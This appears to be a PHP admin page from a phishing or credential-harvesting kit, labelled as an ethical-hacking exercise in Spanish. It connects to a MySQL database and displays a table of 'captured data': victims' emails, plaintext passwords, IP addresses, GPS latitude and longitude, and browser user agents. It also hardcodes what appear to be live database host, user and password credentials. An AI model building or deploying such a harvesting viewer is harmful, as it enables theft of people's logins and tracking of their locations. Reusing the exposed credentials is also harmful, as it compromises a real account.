<?php
// 🔧 MODIFICA ESTOS DATOS CON LOS DE TU CUENTA DE ALWAYS DATA
$host = "mysql-josuealonzo.alwaysdata.net";
$user = "415758";
$pass = "Sonic0820@";
$dbname = "josuealonzo_hackingetico";

// Conexión
$conn = new mysqli($host, $user, $pass, $dbname);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Consulta de datos
$sql = "SELECT * FROM datos ORDER BY fecha DESC";
$result = $conn->query($sql);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Datos Capturados</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background-color: #f4f6f8;
            padding: 20px;
        }
        h2 {
            text-align: center;
            color: #333;
        }
        table {
            border-collapse: collapse;
            margin: auto;
            width: 95%;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        th, td {
            border: 1px solid #ddd;
            padding: 10px;
            vertical-align: top;
        }
        th {
            background-color: #007bff;
            color: white;
        }
        tr:nth-child(even){
            background-color: #f9f9f9;
        }
        td pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            max-width: 400px;
        }
    </style>
</head>
<body>

<h2>📋 Datos Capturados</h2>

<table>
    <thead>
        <tr>
            <th>ID</th>
            <th>Correo</th>
            <th>Contraseña</th>
            <th>IP Cliente</th>
            <th>Latitud</th>
            <th>Longitud</th>
            <th>User-Agent / Info del Navegador</th>
            <th>Fecha</th>
        </tr>
    </thead>
    <tbody>
        <?php if ($result && $result->num_rows > 0): ?>
            <?php while($row = $result->fetch_assoc()): ?>
                <tr>
                    <td><?= htmlspecialchars($row['id']) ?></td>
                    <td><?= htmlspecialchars($row['correo']) ?></td>
                    <td><?= htmlspecialchars($row['contrasena']) ?></td>
                    <td><?= htmlspecialchars($row['ip_cliente']) ?></td>
                    <td><?= htmlspecialchars($row['latitud']) ?></td>
                    <td><?= htmlspecialchars($row['longitud']) ?></td>
                    <td><pre><?= htmlspecialchars($row['user_agent']) ?></pre></td>
                    <td><?= htmlspecialchars($row['fecha']) ?></td>
                </tr>
            <?php endwhile; ?>
        <?php else: ?>
            <tr><td colspan="8" style="text-align:center;">No se encontraron registros.</td></tr>
        <?php endif; ?>
    </tbody>
</table>

</body>
</html>
